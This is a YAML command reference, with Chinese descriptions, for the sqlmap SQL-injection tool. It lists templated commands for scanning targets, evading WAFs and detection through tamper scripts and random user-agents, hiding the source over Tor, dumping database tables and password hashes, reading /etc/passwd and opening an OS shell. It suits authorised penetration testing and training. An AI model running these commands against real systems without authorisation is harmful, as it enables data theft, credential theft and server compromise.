tool: sqlmap
tags: [security, pentest, exploitation, vulnerability-scanner, database, sql-injection, enumeration]

actions:
  # === TARGET SPECIFICATION ===
  - title: sqlmap - 基础 GET 请求扫描
    desc: |
      对带有 GET 参数的特定 URL 执行标准自动化扫描。
      这是测试疑似 SQL 注入漏洞的最常见入口。
      该工具会自动测试查询字符串中的所有参数以查找注入点。
    command: "sqlmap -u \"{{url}}\""

  - title: sqlmap - 扫描 POST 请求
    desc: |
      使用 POST 数据而不是 URL 参数测试目标。
      这对于测试登录表单、搜索框或任何不出现在 URL 中的数据提交至关重要。
      数据字符串的格式应与 HTTP 正文中发送的完全一致（例如 id=1&user=admin）。
    command: "sqlmap -u \"{{url}}\" --data=\"{{post_data}}\""

  - title: sqlmap - 从 HTTP 请求文件扫描
    desc: |
      从文本文件加载完整 HTTP 请求以进行全面测试。
      这是使用 sqlmap 最专业的方式，因为它保留了从 Burp Suite 等工具捕获的所有头、Cookie 和复杂结构。
      只需将原始请求复制到文件中，并使用 -r 标志将 sqlmap 指向它。
    command: "sqlmap -r {{request_file|request.txt}}"

  # === REQUEST CONFIGURATION ===
  - title: sqlmap - 使用认证会话扫描
    desc: |
      指定会话 Cookie 以访问需要认证的页面。
      没有它，sqlmap 可能被重定向到登录页面，从而无法到达易受攻击的代码。
      在开始扫描之前确保 Cookie 有效且未过期。
    command: "sqlmap -u \"{{url}}\" --cookie=\"{{cookie_string}}\""

  - title: sqlmap - 使用随机 User-Agent
    desc: |
      为每个请求发送随机选择的 User-Agent 头。
      这有助于绕过阻止默认 sqlmap user-agent 字符串的基础安全过滤器。
      它使自动化流量看起来更像各种合法的 Web 浏览器。
    command: "sqlmap -u \"{{url}}\" --random-agent"

  - title: sqlmap - 通过 Tor 路由
    desc: |
      通过 Tor 匿名网络路由所有扫描流量。
      这会隐藏攻击者的真实 IP 地址，但由于网络延迟会显著减慢测试过程。
      需要 Tor 服务在本地默认端口上运行。
    command: "sqlmap -u \"{{url}}\" --tor"

  # === DETECTION AND TUNING ===
  - title: sqlmap - 提高检测级别和风险
    desc: |
      增加测试的深度和激进程度。
      级别 3 增加对 Referer 和 User-Agent 等 HTTP 头的测试，而风险 3 增加可能修改数据库内容的重型 OR 测试。
      仅在默认设置无法找到确认漏洞时才使用更高的值。
    command: "sqlmap -u \"{{url}}\" --level={{level|3}} --risk={{risk|2}}"

  - title: sqlmap - 使用 tamper 脚本绕过 WAF
    desc: |
      使用混淆脚本绕过 Web 应用防火墙（WAF）和入侵防御系统（IPS）。
      诸如 space2comment 或 randomcase 之类的 tamper 脚本会修改载荷以规避基于特征的检测。
      如有必要，可以用逗号组合多个脚本。
    command: "sqlmap -u \"{{url}}\" --tamper=\"{{script_name|space2comment}}\""

  # === ENUMERATION ===
  - title: sqlmap - 列出所有数据库
    desc: |
      获取后端数据库管理系统（DBMS）上所有可用数据库的列表。
      这通常是漏洞被成功利用后枚举的第一步。
      它允许渗透测试者识别主要应用数据库与系统数据库。
    command: "sqlmap -u \"{{url}}\" --dbs"

  - title: sqlmap - 列出数据库中的表
    desc: |
      枚举特定数据库中的所有表。
      必须使用 -D 标志指定数据库名称以缩小范围。
      识别表名有助于定位 users、passwords 或 configurations 等敏感数据。
    command: "sqlmap -u \"{{url}}\" -D {{database_name}} --tables"

  - title: sqlmap - 转储表内容
    desc: |
      下载并保存特定表中的所有记录。
      此命令实际上将数据从远程数据库外带到本地 CSV 或 SQLite 文件。
      转储大型表时要谨慎，因为它可能非常缓慢并在目标服务器上产生大量日志。
    command: "sqlmap -u \"{{url}}\" -D {{database_name}} -T {{table_name}} --dump"

  - title: sqlmap - 获取数据库用户密码
    desc: |
      尝试提取数据库用户的密码哈希。
      如果成功，sqlmap 通常会提议执行字典攻击来破解哈希。
      如果 DBA 账户被攻陷，这可能导致对数据库服务器的完全管理控制。
    command: "sqlmap -u \"{{url}}\" --passwords"

  # === OPERATING SYSTEM ACCESS ===
  - title: sqlmap - 交互式 OS shell
    desc: |
      尝试在底层操作系统上获得命令行 shell。
      这需要高数据库权限（如 FILE 或管理权限）和特定的 DBMS 配置。
      如果成功，它允许攻击者直接在服务器上执行操作系统命令。
    command: "sqlmap -u \"{{url}}\" --os-shell"

  - title: sqlmap - 读取本地文件
    desc: |
      通过数据库读取服务器本地文件系统中的特定文件。
      这对于获取 /etc/passwd 或 web.config 等敏感配置文件很有用。
      此操作要成功，数据库用户必须具有必要的 FILE 读取权限。
    command: "sqlmap -u \"{{url}}\" --file-read=\"{{remote_file|/etc/passwd}}\""

  # === MISCELLANEOUS ===
  - title: sqlmap - 自动化批处理模式
    desc: |
      运行工具而不提示任何用户输入。
      它会自动为过程中的每个问题选择默认行为。
      这非常适合无法手动干预的自动化脚本或 CI/CD 流水线。
    command: "sqlmap -u \"{{url}}\" --batch"

  - title: sqlmap - 刷新会话/缓存
    desc: |
      清除当前目标的会话文件和缓存。
      如果你想从头开始全新扫描，忽略之前运行的结果，请使用。
      当目标环境已更改或之前的结果已损坏时，这很有帮助。
    command: "sqlmap -u \"{{url}}\" --flush-session"